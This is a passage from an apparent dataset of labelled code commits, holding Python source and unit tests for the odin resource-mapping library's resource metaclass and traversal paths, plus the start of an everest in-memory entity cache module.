        path = traversal.TraversalPath.parse('level2s[d].level3s{name=h}')
        self.assertRaises(KeyError, path.get_value, TEST_STRUCTURE)
/n/n/n",0
193,c498663b4582d41430bc54f79670ea5306ffdab8,"/odin/resources.py/n/n# -*- coding: utf-8 -*-
import copy
import six
from odin import exceptions, registration
from odin.exceptions import ValidationError
from odin.fields import NOT_PROVIDED
from odin.utils import cached_property, field_iter_items


DEFAULT_TYPE_FIELD = '$'
META_OPTION_NAMES = (
    'name', 'namespace', 'name_space', 'verbose_name', 'verbose_name_plural', 'abstract', 'doc_group', 'type_field',
    'key_field'
)


class ResourceOptions(object):
    def __init__(self, meta):
        self.meta = meta
        self.parents = []
        self.fields = []
        self.virtual_fields = []

        self.name = None
        self.class_name = None
        self.name_space = NOT_PROVIDED
        self.verbose_name = None
        self.verbose_name_plural = None
        self.abstract = False
        self.doc_group = None
        self.type_field = DEFAULT_TYPE_FIELD
        self.key_field = None

        self._cache = {}

    def contribute_to_class(self, cls, name):
        cls._meta = self
        self.name = cls.__name__
        self.class_name = ""%s.%s"" % (cls.__module__, cls.__name__)

        if self.meta:
            meta_attrs = self.meta.__dict__.copy()
            for name in self.meta.__dict__:
                if name.startswith('_'):
                    del meta_attrs[name]
            for attr_name in META_OPTION_NAMES:
                if attr_name in meta_attrs:
                    # Allow meta to be defined as namespace
                    if attr_name == 'namespace':
                        setattr(self, 'name_space', meta_attrs.pop(attr_name))
                    else:
                        setattr(self, attr_name, meta_attrs.pop(attr_name))
                elif hasattr(self.meta, attr_name):
                    setattr(self, attr_name, getattr(self.meta, attr_name))

            # Any leftover attributes must be invalid.
            if meta_attrs != {}:
                raise TypeError(""'class Meta' got invalid attribute(s): %s"" % ','.join(meta_attrs.keys()))
        del self.meta

        if not self.verbose_name:
            self.verbose_name = self.name.replace('_', ' ').strip('_ ')
        if not self.verbose_name_plural:
            self.verbose_name_plural = self.verbose_name + 's'

    def add_field(self, field):
        self.fields.append(field)
        cached_property.clear_caches(self)

    def add_virtual_field(self, field):
        self.virtual_fields.append(field)
        cached_property.clear_caches(self)

    @property
    def resource_name(self):
        """"""
        Full name of resource including namespace (if specified)
        """"""
        if self.name_space:
            return ""%s.%s"" % (self.name_space, self.name)
        else:
            return self.name

    @cached_property
    def all_fields(self):
        """"""
        All fields both standard and virtual.
        """"""
        return self.fields + self.virtual_fields

    @cached_property
    def composite_fields(self):
        """"""
        All composite fields.
        """"""
        # Not the nicest solution but is a fairly safe way of detecting a composite field.
        return [f for f in self.fields if (hasattr(f, 'of') and issubclass(f.of, Resource))]

    @cached_property
    def container_fields(self):
        """"""
        All composite fields with the container flag.

        Used by XML like codecs.

        """"""
        return [f for f in self.composite_fields if getattr(f, 'use_container', False)]

    @cached_property
    def field_map(self):
        return {f.attname: f for f in self.fields}

    @cached_property
    def parent_resource_names(self):
        """"""
        List of parent resource names.
        """"""
        return [p._meta.resource_name for p in self.parents]

    @cached_property
    def attribute_fields(self):
        """"""
        List of fields where is_attribute is True.
        """"""
        return [f for f in self.fields if f.is_attribute]

    @cached_property
    def element_fields(self):
        """"""
        List of fields where is_attribute is False.
        """"""
        return [f for f in self.fields if not f.is_attribute]

    @cached_property
    def element_field_map(self):
        return {f.attname: f for f in self.element_fields}

    def __repr__(self):
        return '<Options for %s>' % self.resource_name


class ResourceBase(type):
    """"""
    Metaclass for all Resources.
    """"""
    def __new__(cls, name, bases, attrs):
        super_new = super(ResourceBase, cls).__new__

        # attrs will never be empty for classes declared in the standard way
        # (ie. with the `class` keyword). This is quite robust.
        if name == 'NewBase' and attrs == {}:
            return super_new(cls, name, bases, attrs)

        parents = [b for b in bases if isinstance(b, ResourceBase) and not (b.__name__ == 'NewBase'
                                                                            and b.__mro__ == (b, object))]
        if not parents:
            # If this isn't a subclass of Resource, don't do anything special.
            return super_new(cls, name, bases, attrs)

        # Create the class.
        module = attrs.pop('__module__')
        new_class = super_new(cls, name, bases, {'__module__': module})
        attr_meta = attrs.pop('Meta', None)
        abstract = getattr(attr_meta, 'abstract', False)
        if not attr_meta:
            meta = getattr(new_class, 'Meta', None)
        else:
            meta = attr_meta
        base_meta = getattr(new_class, '_meta', None)

        new_class.add_to_class('_meta', ResourceOptions(meta))

        # Generate a namespace if one is not provided
        if new_class._meta.name_space is NOT_PROVIDED and base_meta:
            # Namespace is inherited
            if (not new_class._meta.name_space) or (new_class._meta.name_space is NOT_PROVIDED):
                new_class._meta.name_space = base_meta.name_space

        if new_class._meta.name_space is NOT_PROVIDED:
            new_class._meta.name_space = module

        # Bail out early if we have already created this class.
        r = registration.get_resource(new_class._meta.resource_name)
        if r is not None:
            return r

        # Add all attributes to the class.
        for obj_name, obj in attrs.items():
            new_class.add_to_class(obj_name, obj)

        # Sort the fields
        new_class._meta.fields = sorted(new_class._meta.fields, key=hash)

        # All the fields of any type declared on this model
        local_field_attnames = set([f.attname for f in new_class._meta.fields])
        field_attnames = set(local_field_attnames)

        for base in parents:
            if not hasattr(base, '_meta'):
                # Things without _meta aren't functional models, so they're
                # uninteresting parents.
                continue

            # Check for clashes between locally declared fields and those
            # on the base classes (we cannot handle shadowed fields at the
            # moment).
            for field in base._meta.all_fields:
                if field.attname in local_field_attnames:
                    raise Exception('Local field %r in class %r clashes with field of similar name from '
                                    'base class %r' % (field.attname, name, base.__name__))
            for field in base._meta.fields:
                if field.attname not in field_attnames:
                    field_attnames.add(field.attname)
                    new_class.add_to_class(field.attname, copy.deepcopy(field))
            for field in base._meta.virtual_fields:
                new_class.add_to_class(field.attname, copy.deepcopy(field))

            new_class._meta.parents += base._meta.parents
            new_class._meta.parents.append(base)

        # If a key_field is defined ensure it exists
        if new_class._meta.key_field is not None:
            if new_class._meta.key_field not in field_attnames:
                raise Exception('Key field `{}` is not exist on this resource.'.format(new_class._meta.key_field))

        if abstract:
            return new_class

        # Register resource
        registration.register_resources(new_class)

        # Because of the way imports happen (recursively), we may or may not be
        # the first time this model tries to register with the framework. There
        # should only be one class for each model, so we always return the
        # registered version.
        return registration.get_resource(new_class._meta.resource_name)

    def add_to_class(cls, name, value):
        if hasattr(value, 'contribute_to_class'):
            value.contribute_to_class(cls, name)
        else:
            setattr(cls, name, value)


@six.add_metaclass(ResourceBase)
class Resource(object):
    def __init__(self, *args, **kwargs):
        args_len = len(args)
        if args_len > len(self._meta.fields):
            raise TypeError('This resource takes %s positional arguments but %s where given.' % (
                len(self._meta.fields), args_len))

        # The ordering of the zip calls matter - zip throws StopIteration
        # when an iter throws it. So if the first iter throws it, the second
        # is *not* consumed. We rely on this, so don't change the order
        # without changing the logic.
        fields_iter = iter(self._meta.fields)
        if args_len:
            if not kwargs:
                for val, field in zip(args, fields_iter):
                    setattr(self, field.attname, val)
            else:
                for val, field in zip(args, fields_iter):
                    setattr(self, field.attname, val)
                    kwargs.pop(field.name, None)

        # Now we're left with the unprocessed fields that *must* come from
        # keywords, or default.
        for field in fields_iter:
            try:
                val = kwargs.pop(field.attname)
            except KeyError:
                val = field.get_default()
            setattr(self, field.attname, val)

        if kwargs:
            raise TypeError(""'%s' is an invalid keyword argument for this function"" % list(kwargs)[0])

    def __repr__(self):
        return '<%s: %s>' % (self.__class__.__name__, self)

    def __str__(self):
        return '%s resource' % self._meta.resource_name

    @classmethod
    def create_from_dict(cls, d, full_clean=False):
        """"""
        Create a resource instance from a dictionary.
        """"""
        return create_resource_from_dict(d, cls, full_clean)

    def to_dict(self, include_virtual=True):
        """"""
        Convert this resource into a `dict` of field_name/value pairs.

        .. note::
            This method is not recursive, it only operates on this single resource, any sub resources are returned as
            is. The use case that prompted the creation of this method is within codecs when a resource must be
            converted into a type that can be serialised, these codecs then operate recursively on the returned `dict`.

        :param include_virtual: Include virtual fields when generating `dict`.

        """"""
        fields = self._meta.all_fields if include_virtual else self._meta.fields
        return dict((f.name, v) for f, v in field_iter_items(self, fields))

    def convert_to(self, to_resource, context=None, ignore_fields=None, **field_values):
        """"""
        Convert this resource into a specified resource.

        A mapping must be defined for conversion between this resource and to_resource or an exception will be raised.

        """"""
        mapping = registration.get_mapping(self.__class__, to_resource)
        ignore_fields = ignore_fields or []
        ignore_fields.extend(mapping.exclude_fields)
        self.full_clean(ignore_fields)
        return mapping(self, context).convert(**field_values)

    def update_existing(self, dest_obj, context=None, ignore_fields=None):
        """"""
        Update the fields on an existing destination object.

        A mapping must be defined for conversion between this resource and ``dest_obj`` type or an exception will be
        raised.

        """"""
        self.full_clean(ignore_fields)
        mapping = registration.get_mapping(self.__class__, dest_obj.__class__)
        return mapping(self, context).update(dest_obj, ignore_fields)

    def extra_attrs(self, attrs):
        """"""
        Called during de-serialisation of data if there are any extra fields defined in the document.

        This allows the resource to decide how to handle these fields. By default they are ignored.
        """"""
        pass

    def clean(self):
        """"""
        Chance to do more in depth validation.
        """"""
        pass

    def full_clean(self, exclude=None):
        """"""
        Calls clean_fields, clean on the resource and raises ``ValidationError``
        for any errors that occurred.
        """"""
        errors = {}

        try:
            self.clean_fields(exclude)
        except ValidationError as e:
            errors = e.update_error_dict(errors)

        try:
            self.clean()
        except ValidationError as e:
            errors = e.update_error_dict(errors)

        if errors:
            raise ValidationError(errors)

    def clean_fields(self, exclude=None):
        errors = {}

        for f in self._meta.fields:
            if exclude and f.name in exclude:
                continue

            raw_value = f.value_from_object(self)

            if f.null and raw_value is None:
                continue

            try:
                raw_value = f.clean(raw_value)
            except ValidationError as e:
                errors[f.name] = e.messages

            # Check for resource level clean methods.
            clean_method = getattr(self, ""clean_%s"" % f.attname, None)
            if callable(clean_method):
                try:
                    raw_value = clean_method(raw_value)
                except ValidationError as e:
                    errors.setdefault(f.name, []).extend(e.messages)

            setattr(self, f.attname, raw_value)

        if errors:
            raise ValidationError(errors)


def resolve_resource_type(resource):
    if isinstance(resource, type) and issubclass(resource, Resource):
        return resource._meta.resource_name, resource._meta.type_field
    else:
        return resource, DEFAULT_TYPE_FIELD


def create_resource_from_dict(d, resource=None, full_clean=True, copy_dict=True):
    """"""
    Create a resource from a dict.

    :param d: dictionary of data.
    :param resource: A resource type, resource name or list of resources and names to use as the base for creating a
        resource. If a list is supplied the first item will be used if a resource type is not supplied; this could also
        be a parent(s) of any resource defined by the dict.
    :param full_clean: Do a full clean as part of the creation.
    :param copy_dict: Use a copy of the input dictionary rather than destructively processing the input dict.

    """"""
    assert isinstance(d, dict)

    if copy_dict:
        d = d.copy()

    if resource:
        resource_type = None

        # Convert to single resource then resolve document type
        if isinstance(resource, (tuple, list)):
            resources = (resolve_resource_type(r) for r in resource)
        else:
            resources = [resolve_resource_type(resource)]

        for resource_name, type_field in resources:
            # See if the input includes a type field  and check it's registered
            document_resource_name = d.get(type_field, None)
            if document_resource_name:
                resource_type = registration.get_resource(document_resource_name)
            else:
                resource_type = registration.get_resource(resource_name)

            if not resource_type:
                raise exceptions.ResourceException(""Resource `%s` is not registered."" % document_resource_name)

            if document_resource_name:
                # Check resource types match or are inherited types
                if (resource_name == document_resource_name or
                        resource_name in resource_type._meta.parent_resource_names):
                    break  # We are done
            else:
                break

        if not resource_type:
            raise exceptions.ResourceException(
                ""Incoming resource does not match [%s]"" % ', '.join(r for r, t in resources))
    else:
        # No resource specified, relay on type field
        document_resource_name = d.pop(DEFAULT_TYPE_FIELD, None)
        if not document_resource_name:
            raise exceptions.ResourceException(""Resource not defined."")

        # Get an instance of a resource type
        resource_type = registration.get_resource(document_resource_name)
        if not resource_type:
            raise exceptions.ResourceException(""Resource `%s` is not registered."" % document_resource_name)

    attrs = []
    errors = {}
    for f in resource_type._meta.fields:
        value = d.pop(f.name, NOT_PROVIDED)
        if value is NOT_PROVIDED:
            value = f.get_default() if f.use_default_if_not_provided else None
        else:
            try:
                value = f.to_python(value)
            except ValidationError as ve:
                errors[f.name] = ve.error_messages
        attrs.append(value)

    if errors:
        raise ValidationError(errors)

    new_resource = resource_type(*attrs)
    if d:
        new_resource.extra_attrs(d)
    if full_clean:
        new_resource.full_clean()
    return new_resource


def build_object_graph(d, resource=None, full_clean=True, copy_dict=True):
    """"""
    Generate an object graph from a dict

    :param resource: A resource type, resource name or list of resources and names to use as the base for creating a
        resource. If a list is supplied the first item will be used if a resource type is not supplied.
    :raises ValidationError: During building of the object graph and issues discovered are raised as a ValidationError.
    """"""

    if isinstance(d, dict):
        return create_resource_from_dict(d, resource, full_clean, copy_dict)

    if isinstance(d, list):
        return [build_object_graph(o, resource, full_clean, copy_dict) for o in d]

    return d


class ResourceIterable(object):
    """"""
    Iterable that yields resources.
    """"""
    def __init__(self, sequence):
        self.sequence = sequence

    def __iter__(self):
        for item in self.sequence:
            yield item
/n/n/n/odin/traversal.py/n/n# -*- coding: utf-8 -*-
import six


class NotSupplied(object):
    pass


def _split_atom(atom):
    if '[' in atom:
        field, _, idx = atom.rstrip(']').partition('[')
        return idx, NotSupplied, field
    elif '{' in atom:
        field, _, kv = atom.rstrip('}').partition('{')
        key, _, value = kv.partition('=')
        return value, key, field
    else:
        return NotSupplied, NotSupplied, atom


class TraversalPath(object):
    """"""
    A path through a resource structure.
    """"""
    @classmethod
    def parse(cls, path):
        if isinstance(path, TraversalPath):
            return path
        if isinstance(path, six.string_types):
            return cls(*[_split_atom(a) for a in path.split('.')])

    def __init__(self, *path):
        self._path = path

    def __repr__(self):
        return ""<TraversalPath: %s>"" % self

    def __str__(self):
        atoms = []
        for value, key, field in self._path:
            if value is NotSupplied:
                atoms.append(field)
            elif key is NotSupplied:
                atoms.append(""{}[{}]"".format(field, value))
            else:
                atoms.append(""{}{{{}={}}}"".format(field, key, value))
        return '.'.join(atoms)

    def __hash__(self):
        return hash(self._path)

    def __eq__(self, other):
        if isinstance(other, TraversalPath):
            return hash(self) == hash(other)
        return False

    def __add__(self, other):
        if isinstance(other, TraversalPath):
            return TraversalPath(*(self._path + other._path))

        # Assume appending a field
        if isinstance(other, six.string_types):
            return TraversalPath(*(self._path + tuple([(NotSupplied, NotSupplied, other)])))

        raise TypeError(""Cannot add '%s' to a path."" % other)

    def __iter__(self):
        return iter(self._path)

    def get_value(self, root_resource):
        """"""
        Get a value from a resource structure.
        """"""
        result = root_resource
        for value, key, attr in self:
            field = result._meta.field_map[attr]
            result = field.value_from_object(result)
            if value is NotSupplied:
                continue
            elif key is NotSupplied:
                value = field.key_to_python(value)
                result = result[value]
            else:
                pass
        return result


class ResourceTraversalIterator(object):
    """"""
    Iterator for traversing (walking) a resource structure, including traversing composite fields to fully navigate a
    resource tree.

    This class has hooks that can be used by subclasses to customise the behaviour of the class:

     - *on_enter* - Called after entering a new resource.
     - *on_exit* - Called after exiting a resource.

    """"""
    def __init__(self, resource):
        if isinstance(resource, (list, tuple)):
            # Stack of resource iterators (starts initially with entries from the list)
            self._resource_iters = [iter([(i, r) for i, r in enumerate(resource)])]
        else:
            # Stack of resource iterators (starts initially with single entry of the root resource)
            self._resource_iters = [iter([(None, resource)])]
        # Stack of composite fields, found on each resource, each composite field is interrogated for resources.
        self._field_iters = []
        # The ""path"" to the current resource.
        self._path = [(NotSupplied, NotSupplied, NotSupplied)]
        self._resource_stack = [None]

    def __iter__(self):
        return self

    def __next__(self):
        if self._resource_iters:
            if self._field_iters:
                # Check if the last entry in the field stack has any unprocessed fields.
                if self._field_iters[-1]:
                    # Select the very last field in the field stack.
                    field = self._field_iters[-1][0]
                    # Request a list of resources along with keys from the composite field.
                    self._resource_iters.append(field.item_iter_from_object(self.current_resource))
                    # Update the path
                    self._path.append((NotSupplied, NotSupplied, field.name))
                    self._resource_stack.append(None)
                    # Remove the field from the list (and remove this field entry if it has been emptied)
                    self._field_iters[-1].pop(0)
                else:
                    self._field_iters.pop()

            if self.current_resource:
                if hasattr(self, 'on_exit'):
                    self.on_exit()

            try:
                key, next_resource = next(self._resource_iters[-1])
            except StopIteration:
                # End of the current list of resources pop this list off and get the next list.
                self._path.pop()
                self._resource_iters.pop()
                self._resource_stack.pop()

                return next(self)
            else:
                # If we have a key (ie DictOf, ListOf composite fields) update the path key field.
                if key is not None:
                    _, _, field = self._path[-1]
                    self._path[-1] = (key, NotSupplied, field)

                # Get list of any composite fields for this resource (this is a cached field).
                self._field_iters.append(list(next_resource._meta.composite_fields))

                # self.current_resource = next_resource
                self._resource_stack[-1] = next_resource

                if hasattr(self, 'on_enter'):
                    self.on_enter()
                return next_resource
        else:
            raise StopIteration()

    # Python 2.x compatibility
    next = __next__

    @property
    def path(self):
        """"""
        Path to the current resource node in the tree structure.

        This path can be used to later traverse the tree structure to find get to the specified resource.
        """"""
        # The path is offset by one as the path includes the root to simplify next method.
        return TraversalPath(*self._path[1:])

    @property
    def depth(self):
        """"""
        Depth of the current resource in the tree structure.
        """"""
        return len(self._path) - 1

    @property
    def current_resource(self):
        if self._resource_stack:
            return self._resource_stack[-1]
/n/n/n/tests/resources.py/n/n# -*- coding: utf-8 -*-
import odin
from odin.fields.virtual import CalculatedField
from odin.mapping.helpers import sum_fields


class Author(odin.Resource):
    name = odin.StringField()

    class Meta:
        name_space = None


class Publisher(odin.Resource):
    name = odin.StringField()

    class Meta:
        name_space = None


class LibraryBook(odin.Resource):
    class Meta:
        abstract = True
        name_space = ""library""


class Book(LibraryBook):
    class Meta:
        key_field = 'isbn'

    title = odin.StringField()
    isbn = odin.StringField()
    num_pages = odin.IntegerField()
    rrp = odin.FloatField(default=20.4, use_default_if_not_provided=True)
    fiction = odin.BooleanField(is_attribute=True)
    genre = odin.StringField(choices=(
        ('sci-fi', 'Science Fiction'),
        ('fantasy', 'Fantasy'),
        ('biography', 'Biography'),
        ('others', 'Others'),
        ('computers-and-tech', 'Computers & technology'),
    ))
    published = odin.TypedArrayField(odin.DateTimeField())
    authors = odin.ArrayOf(Author, use_container=True)
    publisher = odin.DictAs(Publisher, null=True)

    def __eq__(self, other):
        if other:
            return vars(self) == vars(other)
        return False


class Subscriber(odin.Resource):
    name = odin.StringField()
    address = odin.StringField()

    def __eq__(self, other):
        if other:
            return self.name == other.name and self.address == other.address


class Library(odin.Resource):
    name = odin.StringField()
    books = odin.ArrayOf(LibraryBook)
    subscribers = odin.ArrayOf(Subscriber, null=True)
    book_count = CalculatedField(lambda o: len(o.books))

    class Meta:
        name_space = None


class OldBook(LibraryBook):
    name = odin.StringField()
    num_pages = odin.IntegerField()
    price = odin.FloatField()
    genre = odin.StringField(choices=(
        ('sci-fi', 'Science Fiction'),
        ('fantasy', 'Fantasy'),
        ('biography', 'Biography'),
        ('others', 'Others'),
        ('computers-and-tech', 'Computers & technology'),
    ))
    published = odin.DateTimeField()
    author = odin.ObjectAs(Author)
    publisher = odin.ObjectAs(Publisher)


class OldBookToBookMapping(odin.Mapping):
    from_obj = OldBook
    to_obj = Book

    exclude_fields = ('',)

    mappings = (
        ('name', None, 'title'),
    )


class ChildResource(odin.Resource):
    name = odin.StringField()


class FromResource(odin.Resource):
    # Auto matched
    title = odin.StringField()
    count = odin.StringField()
    child = odin.ObjectAs(ChildResource)
    children = odin.ArrayOf(ChildResource)
    # Excluded
    excluded1 = odin.FloatField()
    # Mappings
    from_field1 = odin.StringField()
    from_field2 = odin.StringField()
    from_field3 = odin.IntegerField()
    from_field4 = odin.IntegerField()
    same_but_different = odin.StringField()
    # Custom mappings
    from_field_c1 = odin.StringField()
    from_field_c2 = odin.StringField()
    from_field_c3 = odin.StringField()
    from_field_c4 = odin.StringField()
    not_auto_c5 = odin.StringField()
    comma_separated_string = odin.StringField()
    # Virtual fields
    constant_field = odin.ConstantField(value=10)


class InheritedResource(FromResource):
    # Additional fields
    name = odin.StringField()
    # Additional virtual fields
    calculated_field = odin.CalculatedField(lambda obj: 11)


class MultiInheritedResource(InheritedResource, FromResource):
    pass


class ToResource(odin.Resource):
    # Auto matched
    title = odin.StringField()
    count = odin.IntegerField()
    child = odin.ObjectAs(ChildResource)
    children = odin.ArrayOf(ChildResource)
    # Excluded
    excluded1 = odin.FloatField()
    # Mappings
    to_field1 = odin.StringField()
    to_field2 = odin.IntegerField()
    to_field3 = odin.IntegerField()
    same_but_different = odin.StringField()
    # Custom mappings
    to_field_c1 = odin.StringField()
    to_field_c2 = odin.StringField()
    to_field_c3 = odin.StringField()
    not_auto_c5 = odin.StringField()
    array_string = odin.TypedArrayField(odin.StringField())
    assigned_field = odin.StringField()


class FromToMapping(odin.Mapping):
    from_obj = FromResource
    to_obj = ToResource

    exclude_fields = ('excluded1',)

    mappings = (
        ('from_field1', None, 'to_field1'),
        ('from_field2', int, 'to_field2'),
        (('from_field3', 'from_field4'), sum_fields, 'to_field3'),
        ('from_field1', None, 'same_but_different'),
    )

    @odin.map_field(from_field=('from_field_c1', 'from_field_c2', 'from_field_c3'), to_field='to_field_c1')
    def multi_to_one(self, *values):
        return '-'.join(values)

    @odin.map_field(from_field='from_field_c4', to_field=('to_field_c2', 'to_field_c3'))
    def one_to_multi(self, value):
        return value.split('-', 1)

    @odin.map_field
    def not_auto_c5(self, value):
        return value.upper()

    @odin.map_list_field(to_field='array_string')
    def comma_separated_string(self, value):
        return value.split(',')

    @odin.assign_field
    def assigned_field(self):
        return 'Foo'
/n/n/n/tests/test_traversal.py/n/nimport unittest
import odin
from odin import traversal


class Level3(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()


class Level2(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()
    level3s = odin.ListOf(Level3)


class Level1(odin.Resource):
    class Meta:
        namespace = 'odin.traversal'

    name = odin.StringField()
    level2 = odin.DictAs(Level2)
    level2s = odin.DictOf(Level2)


TEST_STRUCTURE = Level1(
    name='a',
    level2=Level2(name='b', level3s=[]),
    level2s=dict(
        a=Level2(name='c', level3s=[]),
        b=Level2(name='d', level3s=[Level3(name='e'), Level3(name='f')]),
        c=Level2(name='g', level3s=[Level3(name='h')]),
    )
)

TEST_LIST_STRUCTURE = [
    Level1(
        name='a',
        level2=Level2(name='b', level3s=[]),
        level2s=dict(
            a=Level2(name='c', level3s=[]),
            b=Level2(name='d', level3s=[Level3(name='e'), Level3(name='f')]),
            c=Level2(name='g', level3s=[Level3(name='h')]),
        )
    ),
    Level1(
        name='i',
        level2=Level2(name='j', level3s=[]),
        level2s=dict(
            a=Level2(name='k', level3s=[]),
            b=Level2(name='l', level3s=[Level3(name='m'), Level3(name='n')]),
            c=Level2(name='o', level3s=[Level3(name='p')]),
        )
    )
]


class TestResourceTraversalIterator(traversal.ResourceTraversalIterator):
    def __init__(self, resource):
        super(TestResourceTraversalIterator, self).__init__(resource)
        self.events = []

    def on_pre_enter(self):
        self.events.append(""on_pre_enter: %s"" % self.path)

    def on_enter(self):
        self.events.append(""on_enter: %s"" % self.path)

    def on_exit(self):
        self.events.append(""on_exit: %s"" % self.path)


class TraversalTestCase(unittest.TestCase):
    def test_structure(self):
        TEST_STRUCTURE.full_clean()

        resource_iter = TestResourceTraversalIterator(TEST_STRUCTURE)
        resources = [""%s %s %s"" % (r, r.name, resource_iter.depth) for r in resource_iter]

        self.assertListEqual([
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s[0]',
                    'on_exit: level2s[b].level3s[0]',
                    'on_enter: level2s[b].level3s[1]',
                    'on_exit: level2s[b].level3s[1]',
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s[0]',
                'on_exit: level2s[c].level3s[0]',
                'on_exit: level2s[c]',
            'on_exit: ',
        ], resource_iter.events)

        self.assertListEqual([
            'odin.traversal.Level1 resource a 0',
            'odin.traversal.Level2 resource b 1',
            'odin.traversal.Level2 resource c 1',
            'odin.traversal.Level2 resource d 1',
            'odin.traversal.Level3 resource e 2',
            'odin.traversal.Level3 resource f 2',
            'odin.traversal.Level2 resource g 1',
            'odin.traversal.Level3 resource h 2',
        ], resources)

    def test_list_structure(self):
        TEST_STRUCTURE.full_clean()

        resource_iter = TestResourceTraversalIterator(TEST_LIST_STRUCTURE)
        resources = [""%s %s %s"" % (r, r.name, resource_iter.depth) for r in resource_iter]

        self.assertListEqual([
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s[0]',
                    'on_exit: level2s[b].level3s[0]',
                    'on_enter: level2s[b].level3s[1]',
                    'on_exit: level2s[b].level3s[1]',
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s[0]',
                'on_exit: level2s[c].level3s[0]',
                'on_exit: level2s[c]',
            'on_exit: ',
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s[0]',
                    'on_exit: level2s[b].level3s[0]',
                    'on_enter: level2s[b].level3s[1]',
                    'on_exit: level2s[b].level3s[1]',
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s[0]',
                'on_exit: level2s[c].level3s[0]',
                'on_exit: level2s[c]',
            'on_exit: ',
        ], resource_iter.events)

        self.assertListEqual([
            'odin.traversal.Level1 resource a 0',
            'odin.traversal.Level2 resource b 1',
            'odin.traversal.Level2 resource c 1',
            'odin.traversal.Level2 resource d 1',
            'odin.traversal.Level3 resource e 2',
            'odin.traversal.Level3 resource f 2',
            'odin.traversal.Level2 resource g 1',
            'odin.traversal.Level3 resource h 2',
            'odin.traversal.Level1 resource i 0',
            'odin.traversal.Level2 resource j 1',
            'odin.traversal.Level2 resource k 1',
            'odin.traversal.Level2 resource l 1',
            'odin.traversal.Level3 resource m 2',
            'odin.traversal.Level3 resource n 2',
            'odin.traversal.Level2 resource o 1',
            'odin.traversal.Level3 resource p 2',
        ], resources)


class TraversalPathTestCase(unittest.TestCase):
    def test_parse(self):
        actual = traversal.TraversalPath.parse('level2')
        self.assertEqual(traversal.TraversalPath((traversal.NotSupplied, traversal.NotSupplied, 'level2'),), actual)

        actual = traversal.TraversalPath.parse('level2.name')
        self.assertEqual(traversal.TraversalPath(
            (traversal.NotSupplied, traversal.NotSupplied, 'level2'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

        actual = traversal.TraversalPath.parse('level2s[b].level3s[1].name')
        self.assertEqual(traversal.TraversalPath(
            ('b', traversal.NotSupplied, 'level2s'),
            ('1', traversal.NotSupplied, 'level3s'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

        actual = traversal.TraversalPath.parse('level2s[b].level3s{code=abc}.name')
        self.assertEqual(traversal.TraversalPath(
            ('b', traversal.NotSupplied, 'level2s'),
            ('abc', 'code', 'level3s'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

    def test_add(self):
        actual = traversal.TraversalPath.parse('level2') + 'name'
        self.assertEqual(traversal.TraversalPath.parse('level2.name'), actual)

        actual = traversal.TraversalPath.parse('level2s[b]') + traversal.TraversalPath.parse('level3s[1].name')
        self.assertEqual(traversal.TraversalPath.parse('level2s[b].level3s[1].name'), actual)

    def test_valid_path(self):
        self.assertEqual('a', traversal.TraversalPath.parse('name').get_value(TEST_STRUCTURE))
        self.assertEqual('b', traversal.TraversalPath.parse('level2.name').get_value(TEST_STRUCTURE))

        r = traversal.TraversalPath.parse('level2s[b].level3s[1]').get_value(TEST_STRUCTURE)
        self.assertIsInstance(r, Level3)
        self.assertEqual('f', r.name)

    def test_invalid_path(self):
        path = traversal.TraversalPath.parse('level2s[b].level3s[4]')
        self.assertRaises(IndexError, path.get_value, TEST_STRUCTURE)

        path = traversal.TraversalPath.parse('level2s[b].level3s_sd[1]')
        self.assertRaises(KeyError, path.get_value, TEST_STRUCTURE)
/n/n/n",1
194,501c655e6992edbf032dfe95b9bed83fdbe649d5,"everest/repositories/memory/cache.py/n/n""""""
Entity cache and cache map.

This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Feb 26, 2013.
""""""
from collections import defaultdict
from everest.repositories.memory.querying import MemoryQuery
from everest.repositories.state import EntityStateManager
from itertools import islice
from weakref import WeakValueDictionary

__docformat__ = 'reStructuredText en'
__all__ = ['EntityCache',
           'EntityCacheMap',
           ]


class EntityCache(object):
    """"""
    Cache for entities.

    Supports add and remove operations as well as lookup by ID and
    by slug.
    """"""
    def __init__(self, entities=None, allow_none_id=True):
        """"""
        :param bool allow_none_id: Flag specifying if calling :meth:`add`
            with an entity that does not have an ID is allowed.
        """"""
        #
        self.__allow_none_id = allow_none_id
        # List of cached entities. This is the only place we are holding a
        # real reference to the entity.
        if entities is None:
            entities = []
        self.__entities = entities
        # Dictionary mapping entity IDs to entities for fast lookup by ID.
        self.__id_map = WeakValueDictionary()
        # Dictionary mapping entity slugs to entities for fast lookup by slug.
        self.__slug_map = WeakValueDictionary()

    def get_by_id(self, entity_id):
        """"""
        Performs a lookup of an entity by its ID.

        :param int entity_id: entity ID.
        :return: entity found or ``None``.
        """"""
        return self.__id_map.get(entity_id)

    def has_id(self, entity_id):
        """"""
        Checks if this entity cache holds an entity with the given ID.

        :return: Boolean result of the check.
        """"""
        return entity_id in self.__id_map

    def get_by_slug(self, entity_slug):
        """"""
        Performs a lookup of an entity by its slug.

        :param str entity_id: entity slug.
        :return: entity found or ``None``.
        """"""
        return self.__slug_map.get(entity_slug)

    def has_slug(self, entity_slug):
        return entity_slug in self.__slug_map

    def add(self, entity):
        """"""
        Adds the given entity to this cache.

        :param entity: Entity to add.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises ValueError: If the ID of the entity to add is ``None``.
        """"""
        # For certain use cases (e.g., staging), we do not want the entity to
        # be added to have an ID yet.
        do_append = True
